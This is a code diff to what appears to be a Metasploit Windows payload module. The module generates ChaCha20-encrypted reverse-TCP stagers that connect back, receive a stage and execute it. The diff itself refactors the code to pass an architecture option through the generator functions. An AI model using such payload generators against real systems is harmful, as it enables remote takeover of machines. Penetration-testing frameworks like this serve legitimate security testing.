@@ -61,9 +61,9 @@ module Payload::Windows::EncryptedReverseTcp
 
     src = ''
     if staged?
-      src = generate_stager(conf)
+      src = generate_stager(conf, opts)
     else
-      src = generate_c_src(conf)
+      src = generate_c_src(conf, opts)
     end
 
     link_script = module_info['DefaultOptions']['LinkerScript']
@@ -76,7 +76,7 @@ module Payload::Windows::EncryptedReverseTcp
       keep_exe:      datastore['KeepExe'],
       show_compile_cmd: datastore['ShowCompileCMD'],
       f_name:        Tempfile.new(staged? ? 'reverse_pic_stager' : 'reverse_pic_stageless').path,
-      arch:          self.arch_to_s
+      arch:          opts.fetch(:arch, self.arch_to_s)
     }
 
     comp_code = get_compiled_shellcode(src, compile_opts)
@@ -92,9 +92,9 @@ module Payload::Windows::EncryptedReverseTcp
     comp_code
   end
 
-  def initial_code
+  def initial_code(conf, opts = {})
     src = headers
-    src << align_rsp if self.arch_to_s.eql?('x64')
+    src << align_rsp if opts.fetch(:arch, self.arch_to_s).eql?('x64')
 
     if staged?
       src << chacha_func_staged
@@ -104,8 +104,8 @@ module Payload::Windows::EncryptedReverseTcp
     src << exit_proc
   end
 
-  def generate_stager(conf)
-    src = initial_code
+  def generate_stager(conf, opts = {})
+    src = initial_code(conf, opts)
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -115,7 +115,7 @@ module Payload::Windows::EncryptedReverseTcp
     src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
     src << start_comm(conf[:uuid])
-    src << stager_comm
+    src << stager_comm(conf, opts)
   end
 
   def sends_hex_uuid?
@@ -148,21 +148,21 @@ module Payload::Windows::EncryptedReverseTcp
       keep_exe:      datastore['KeepExe'],
       show_compile_cmd: datastore['ShowCompileCMD'],
       f_name:        Tempfile.new('reverse_pic_stage').path,
-      arch:          self.arch_to_s
+      arch:          opts.fetch(:arch, self.arch_to_s)
     }
 
-    src = initial_code
+    src = initial_code(conf, opts)
     src << get_new_key
     src << init_proc
-    src << exec_payload_stage
+    src << exec_payload_stage(conf, opts)
     shellcode = get_compiled_shellcode(src, comp_opts)
 
     stage_obj = Rex::Crypto::Chacha20.new(key, iv)
     stage_obj.chacha20_crypt(shellcode)
   end
 
-  def generate_c_src(conf)
-    src = initial_code
+  def generate_c_src(conf, opts = {})
+    src = initial_code(conf, opts)
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -552,9 +552,10 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def stager_comm
-    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
-    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'
+  def stager_comm(conf, opts = {})
+    arch = opts.fetch(:arch, self.arch_to_s)
+    reg = arch.eql?('x86') ? 'edi' : 'rdi'
+    inst = arch.eql?('x86') ? 'movl' : 'movq'
 
     %Q^
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
@@ -596,9 +597,10 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def exec_payload_stage
-    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
-    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'
+  def exec_payload_stage(conf, opts = {})
+    arch = opts.fetch(:arch, self.arch_to_s)
+    reg = arch.eql?('x86') ? 'edi' : 'rdi'
+    inst = arch.eql?('x86') ? 'movl' : 'movq'
 
     %Q^
      void ExecutePayload()
